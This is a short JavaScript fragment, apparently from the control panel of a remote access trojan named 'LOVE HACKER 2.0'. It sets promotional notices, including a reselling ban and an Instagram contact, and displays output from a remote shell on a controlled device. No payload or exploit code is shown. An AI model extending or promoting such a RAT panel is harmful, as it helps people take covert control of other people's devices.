...
pd3.innerHTML="<center> <h3 style='color:red'>•Notice•<h3> </center><br>This is an Open Source RAT named <b style='color:gold'>LOVE HACKER 2.0</b> available for free on <a href='https://www.instagram.com/love__hacker__2.0/AIRAVAT' style='color:#0f8;'>Instagram</a>. Reselling , Changing Brand Name , Logo  of free version are strictly prohibited.";
...
pd1.innerHTML="Want More Features Contact at <a href='https://www.instagram.com/love__hacker__2.0/' style='color:#0f8;'>@Love Hacker 2.0</a>";
...
pd.innerHTML="&copy; Ghansham Raut";
...
$("#shellcmd").css("display","block");
$("#shelldata").html("LOVE HACKER Shell<br><br>"+o.replaceAll("\n","<br>"))
